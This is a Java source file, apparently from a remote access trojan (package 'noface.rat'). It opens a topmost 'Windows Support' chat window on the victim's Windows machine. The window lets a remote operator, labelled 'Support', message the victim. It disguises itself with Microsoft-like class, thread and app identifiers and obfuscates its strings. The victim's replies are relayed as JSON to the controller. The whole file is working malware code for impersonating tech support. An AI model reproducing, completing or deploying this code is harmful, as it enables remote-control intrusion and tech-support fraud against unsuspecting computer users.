package noface.rat;

import com.sun.jna.CallbackReference;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HBRUSH;
import com.sun.jna.platform.win32.WinDef.HINSTANCE;
import com.sun.jna.platform.win32.WinDef.HMENU;
import com.sun.jna.platform.win32.WinDef.HWND;
import com.sun.jna.platform.win32.WinDef.LPARAM;
import com.sun.jna.platform.win32.WinDef.LRESULT;
import com.sun.jna.platform.win32.WinDef.RECT;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinUser.MSG;
import com.sun.jna.platform.win32.WinUser.WNDCLASSEX;
import com.sun.jna.platform.win32.WinUser.WindowProc;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;
import noface.config.Log;
import noface.config.S;

import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.function.Consumer;

public final class Talk {

    private static final int WS_WIN = 0x10CF0000;
    private static final int WS_EX = 0x00040008;
    private static final int HIST_ST = 0x50A00844;
    private static final int BOX_ST = 0x50810080;
    private static final int BTN_ST = 0x50010001;
    private static final int WM_SETFONT = 0x0030;
    private static final int WM_SETTEXT = 0x000C;
    private static final int WM_COMMAND = 0x0111;
    private static final int WM_KEYDOWN = 0x0100;
    private static final int WM_SETICON = 0x0080;
    private static final int EM_SETSEL = 0x00B1;
    private static final int EM_REPLACESEL = 0x00C2;
    private static final int PULL = 0x8001;
    private static final int ID_BOX = 102;
    private static final int ID_BTN = 103;
    private static final int GWLP_WNDPROC = -4;
    private static final int DEFAULT_GUI_FONT = 17;

    public interface Gdi extends StdCallLibrary {
        Gdi I = Native.load(S.e("gdi32"), Gdi.class, W32APIOptions.DEFAULT_OPTIONS);

        Pointer GetStockObject(int i);
    }

    public interface Ui extends StdCallLibrary {
        Ui I = Native.load(S.e("user32"), Ui.class, W32APIOptions.UNICODE_OPTIONS);

        Pointer LoadImage(HINSTANCE inst, Pointer name, int type, int cx, int cy, int fu);

        Pointer LoadCursor(HINSTANCE inst, Pointer name);

        LRESULT SendMessage(HWND h, int msg, WPARAM w, String text);
    }

    public interface Sh extends StdCallLibrary {
        Sh I = Native.load(S.e("shell32"), Sh.class, W32APIOptions.UNICODE_OPTIONS);

        int SetCurrentProcessExplicitAppUserModelID(String id);
    }

    private static Consumer<String> sink;
    private static volatile boolean open;
    private static volatile HWND frame;
    private static volatile HWND hist;
    private static volatile HWND box;
    private static volatile HWND btn;
    private static Pointer oldBox;
    private static Thread pump;
    private static HINSTANCE inst;
    private static final ConcurrentLinkedQueue<String> inbox = new ConcurrentLinkedQueue<>();

    private static final WindowProc wnd = Talk::onFrame;
    private static final WindowProc boxWnd = Talk::onBox;

    public static void bind(Consumer<String> s) {
        sink = s;
    }

    public static void open() {
        mark();
        if (open && frame != null) {
            User32.INSTANCE.ShowWindow(frame, WinUser.SW_SHOW);
            HWND top = hwnd(-1);
            User32.INSTANCE.SetWindowPos(frame, top, 0, 0, 0, 0, 0x0003);
            return;
        }
        if (pump != null && pump.isAlive()) return;
        pump = new Thread(Talk::loop, S.e("sihost"));
        pump.setDaemon(true);
        pump.start();
    }

    public static void inbound(String from, String text) {
        if (text == null || text.isBlank()) return;
        String who = S.e("op").equals(from) ? S.e("Support") : S.e("You");
        String line = who + ": " + text.trim();
        if (line.length() > 400) line = line.substring(0, 400);
        inbox.add(line);
        if (!open || frame == null) {
            open();
            return;
        }
        User32.INSTANCE.PostMessage(frame, PULL, new WPARAM(0), new LPARAM(0));
    }

    public static void close() {
        HWND h = frame;
        if (h != null) {
            User32.INSTANCE.PostMessage(h, WinUser.WM_CLOSE, new WPARAM(0), new LPARAM(0));
        }
    }

    public static boolean live() {
        return open;
    }

    static void mark() {
        try {
            Sh.I.SetCurrentProcessExplicitAppUserModelID(S.e("Microsoft.Windows.Shell.RunDialog"));
        } catch (Exception ignored) {
        }
    }

    private static void loop() {
        try {
            build();
            if (frame == null) return;
            MSG msg = new MSG();
            int r;
            while ((r = User32.INSTANCE.GetMessage(msg, null, 0, 0)) != 0) {
                if (r == -1) break;
                User32.INSTANCE.TranslateMessage(msg);
                User32.INSTANCE.DispatchMessage(msg);
            }
        } catch (Throwable e) {
            String m = e.getMessage() != null ? e.getMessage() : e.getClass().getSimpleName();
            Log.err(S.e("talk: ") + m);
            emit("{\"op\":\"" + S.e("talk.gone") + "\",\"err\":\"" + esc(m) + "\"}");
        } finally {
            wipe();
        }
    }

    private static void build() {
        inst = new HINSTANCE();
        inst.setPointer(Kernel32.INSTANCE.GetModuleHandle(null).getPointer());
        String cls = S.e("WinREAgent.Host");
        WNDCLASSEX wc = new WNDCLASSEX();
        wc.cbSize = wc.size();
        wc.style = 3;
        wc.lpfnWndProc = wnd;
        wc.hInstance = inst;
        Pointer ico = Ui.I.LoadImage(null, Pointer.createConstant(32512), 1, 0, 0, 0x8000);
        if (ico != null) {
            wc.hIcon = icon(ico);
            wc.hIconSm = wc.hIcon;
        }
        Pointer cur = Ui.I.LoadCursor(null, Pointer.createConstant(32512));
        if (cur != null) {
            wc.hCursor = new com.sun.jna.platform.win32.WinDef.HCURSOR();
            wc.hCursor.setPointer(cur);
        }
        HBRUSH br = new HBRUSH();
        br.setPointer(Pointer.createConstant(6));
        wc.hbrBackground = br;
        wc.lpszClassName = cls;
        User32.INSTANCE.RegisterClassEx(wc);
        int sw = User32.INSTANCE.GetSystemMetrics(0);
        int sh = User32.INSTANCE.GetSystemMetrics(1);
        int ww = 440;
        int wh = 560;
        int x = Math.max(0, (sw - ww) / 2);
        int y = Math.max(0, (sh - wh) / 2);
        HWND h = User32.INSTANCE.CreateWindowEx(
                WS_EX, cls, S.e("Windows Support"), WS_WIN,
                x, y, ww, wh, null, null, inst, null);
        if (h == null) {
            throw new IllegalStateException(S.e("hwnd"));
        }
        frame = h;
        if (ico != null) {
            User32.INSTANCE.SendMessage(h, WM_SETICON, new WPARAM(0), new LPARAM(Pointer.nativeValue(ico)));
            User32.INSTANCE.SendMessage(h, WM_SETICON, new WPARAM(1), new LPARAM(Pointer.nativeValue(ico)));
        }
        hist = child(S.e("EDIT"), HIST_ST, 101);
        box = child(S.e("EDIT"), BOX_ST, ID_BOX);
        btn = child(S.e("BUTTON"), BTN_ST, ID_BTN);
        Ui.I.SendMessage(btn, WM_SETTEXT, new WPARAM(0), S.e("Send"));
        Pointer font = Gdi.I.GetStockObject(DEFAULT_GUI_FONT);
        if (font != null) {
            WPARAM fp = new WPARAM(Pointer.nativeValue(font));
            LPARAM one = new LPARAM(1);
            User32.INSTANCE.SendMessage(hist, WM_SETFONT, fp, one);
            User32.INSTANCE.SendMessage(box, WM_SETFONT, fp, one);
            User32.INSTANCE.SendMessage(btn, WM_SETFONT, fp, one);
        }
        oldBox = Pointer.createConstant(User32.INSTANCE.GetWindowLongPtr(box, GWLP_WNDPROC).longValue());
        Pointer np = CallbackReference.getFunctionPointer(boxWnd);
        User32.INSTANCE.SetWindowLongPtr(box, GWLP_WNDPROC, np);
        place();
        User32.INSTANCE.ShowWindow(h, WinUser.SW_SHOW);
        User32.INSTANCE.UpdateWindow(h);
        HWND top = hwnd(-1);
        User32.INSTANCE.SetWindowPos(h, top, 0, 0, 0, 0, 0x0003);
        User32.INSTANCE.SetFocus(box);
        open = true;
        drain();
        emit("{\"op\":\"" + S.e("talk.open") + "\",\"ok\":true}");
    }

    private static HWND child(String kind, int style, int id) {
        return User32.INSTANCE.CreateWindowEx(0, kind, "", style, 0, 0, 10, 10, frame, cid(id), inst, null);
    }

    private static LRESULT onFrame(HWND h, int msg, WPARAM w, LPARAM l) {
        if (msg == WinUser.WM_SIZE) {
            place();
            return new LRESULT(0);
        }
        if (msg == PULL) {
            drain();
            return new LRESULT(0);
        }
        if (msg == WM_COMMAND) {
            int wp = (int) w.longValue();
            int id = wp & 0xFFFF;
            int code = (wp >>> 16) & 0xFFFF;
            if (id == ID_BTN && code == 0) push();
            return new LRESULT(0);
        }
        if (msg == WinUser.WM_CLOSE) {
            User32.INSTANCE.DestroyWindow(h);
            return new LRESULT(0);
        }
        if (msg == WinUser.WM_DESTROY) {
            gone();
            User32.INSTANCE.PostQuitMessage(0);
            return new LRESULT(0);
        }
        return User32.INSTANCE.DefWindowProc(h, msg, w, l);
    }

    private static LRESULT onBox(HWND h, int msg, WPARAM w, LPARAM l) {
        if (msg == WM_KEYDOWN && (int) w.longValue() == 0x0D) {
            push();
            return new LRESULT(0);
        }
        Pointer prev = oldBox;
        if (prev == null) return new LRESULT(0);
        return User32.INSTANCE.CallWindowProc(prev, h, msg, w, l);
    }

    private static void place() {
        HWND h = frame;
        if (h == null || hist == null || box == null || btn == null) return;
        RECT r = new RECT();
        User32.INSTANCE.GetClientRect(h, r);
        int w = r.right - r.left;
        int ht = r.bottom - r.top;
        int pad = 10;
        int bh = 28;
        int bw = 72;
        User32.INSTANCE.MoveWindow(hist, pad, pad, w - pad * 2, ht - pad * 3 - bh, true);
        User32.INSTANCE.MoveWindow(box, pad, ht - pad - bh, w - pad * 3 - bw, bh, true);
        User32.INSTANCE.MoveWindow(btn, w - pad - bw, ht - pad - bh, bw, bh, true);
    }

    private static void drain() {
        String line;
        while ((line = inbox.poll()) != null) add(line);
    }

    private static void add(String line) {
        if (hist == null) return;
        int n = User32.INSTANCE.GetWindowTextLength(hist);
        User32.INSTANCE.SendMessage(hist, EM_SETSEL, new WPARAM(n), new LPARAM(n));
        Ui.I.SendMessage(hist, EM_REPLACESEL, new WPARAM(1), line + "\r\n");
    }

    private static void push() {
        if (box == null) return;
        int n = User32.INSTANCE.GetWindowTextLength(box) + 1;
        if (n <= 1) return;
        char[] buf = new char[n];
        User32.INSTANCE.GetWindowText(box, buf, n);
        String text = Native.toString(buf);
        if (text == null) return;
        text = text.trim();
        if (text.isEmpty()) return;
        if (text.length() > 500) text = text.substring(0, 500);
        Ui.I.SendMessage(box, WM_SETTEXT, new WPARAM(0), "");
        add(S.e("You") + ": " + text);
        emit("{\"op\":\"" + S.e("talk.msg") + "\",\"from\":\"" + S.e("pc") + "\",\"text\":\"" + esc(text) + "\"}");
    }

    private static void gone() {
        if (!open) return;
        open = false;
        emit("{\"op\":\"" + S.e("talk.gone") + "\"}");
    }

    private static void wipe() {
        open = false;
        frame = null;
        hist = null;
        box = null;
        btn = null;
        oldBox = null;
        pump = null;
    }

    private static void emit(String json) {
        Consumer<String> s = sink;
        if (s != null) {
            try {
                s.accept(json);
            } catch (Exception ignored) {
            }
        }
    }

    private static com.sun.jna.platform.win32.WinDef.HICON icon(Pointer p) {
        com.sun.jna.platform.win32.WinDef.HICON i = new com.sun.jna.platform.win32.WinDef.HICON();
        i.setPointer(p);
        return i;
    }

    private static HWND hwnd(long v) {
        HWND h = new HWND();
        h.setPointer(Pointer.createConstant(v));
        return h;
    }

    private static HMENU cid(int n) {
        HMENU m = new HMENU();
        m.setPointer(Pointer.createConstant(n));
        return m;
    }

    private static String esc(String s) {
        if (s == null) return "";
        StringBuilder b = new StringBuilder(s.length() + 8);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '\\' -> b.append("\\\\");
                case '"' -> b.append("\\\"");
                case '\n' -> b.append("\\n");
                case '\r' -> b.append("\\r");
                case '\t' -> b.append("\\t");
                default -> {
                    if (c < 32) b.append(' ');
                    else b.append(c);
                }
            }
        }
        return b.toString();
    }

    private Talk() {}
}
